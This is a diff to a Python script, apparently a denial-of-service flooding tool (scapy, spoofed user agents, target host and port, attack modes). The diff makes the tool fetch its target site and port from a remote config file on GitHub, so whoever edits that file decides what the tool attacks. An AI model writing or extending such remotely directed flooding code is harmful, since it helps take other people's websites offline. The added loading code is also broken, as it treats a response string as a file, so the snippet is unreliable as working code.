@@ -19,6 +19,11 @@ from sys import stdout
 from scapy.all import *
 from random import randint
 
+cfg = requests.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
+
+with cfg.text as f:
+    config = json.load(f)
+
 urllib3.disable_warnings()
 urllib3.PoolManager()
 
@@ -132,7 +137,7 @@ useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Fir
 
 def start_url():
     global url, url_main, host_url, host_ip, port
-    url = "example.com".strip()
+    url = config["site"].strip()
     if url == "":
         start_url()
     url_main = url
@@ -158,16 +163,8 @@ def start_url():
 
 def start_port():
     global port
-    port = ''
-    if port == '':
-        if "https" in url:
-                port = int(443)
-        else:
-            port = int(80)
-    else:
-        port = int(port)
-
-
+    port = config["port"]
+    
 def start_mode():
     global choice_mode, filenam1, filenam2, method_
     choice_mode = str(4)
